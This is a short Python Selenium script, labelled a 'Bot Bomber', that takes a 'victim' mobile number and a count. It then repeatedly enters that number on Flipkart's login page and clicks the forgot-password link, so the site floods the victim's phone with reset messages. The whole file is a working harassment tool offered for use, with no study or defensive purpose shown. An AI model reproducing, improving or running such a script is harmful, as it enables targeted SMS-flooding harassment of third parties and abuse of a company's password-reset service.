print("*************************************************************")
print("*                  My Selenium Python Bot Bomber            *")
print("*                  Made By  Abhijeet                        *")
print("*                  (abhijit, coder0101001)                  *")
print("*************************************************************")


from selenium import webdriver

from time import sleep



# Taking the frequency value from the users 

frequency = int(input("Enter the frequency rate value "))

print("The Frequency rate value is : "+ str(frequency))

# Taking the victim mobile number 

victim_mobile_number= int(input("Enter the victim_mobile_number "))

if len(str(victim_mobile_number))!=10:
    print("Phone number should be of 10 digit")
    print("ReEnter the phone number please.!!")
    victim_mobile_number= int(input("Enter the victim_mobile_number "))
    quit()

    print("The victim phone number is "+ str(victim_mobile_number))

driver= webdriver.Firefox(executable_path=r'C:\python3\Lib\site-packages\selenium\webdriver\firefox\geckodriver.exe')

driver.get("https://www.flipkart.com/account/login?ret =/")
driver.execute_script("window.alert")

count = int(0)  # intializing the count value to 0

for i in range(frequency):
 
 sleep(7)
 numberInputFind= driver.find_element_by_xpath('/html/body/div/div/div[3]/div/div[2]/div/form/div[1]/input')
 numberInputFind.send_keys(victim_mobile_number)

 forgetButton= driver.find_element_by_xpath("/html/body/div/div/div[3]/div/div[2]/div/form/div[2]/a")
 forgetButton.click()

 # counting the per bombing value...
 count += int(1)

 print("The Bomber sent "+ str(count)+" message")

 sleep(8)
 driver.refresh()

print("Thanks for using the Bot....BBye")
driver.quit()





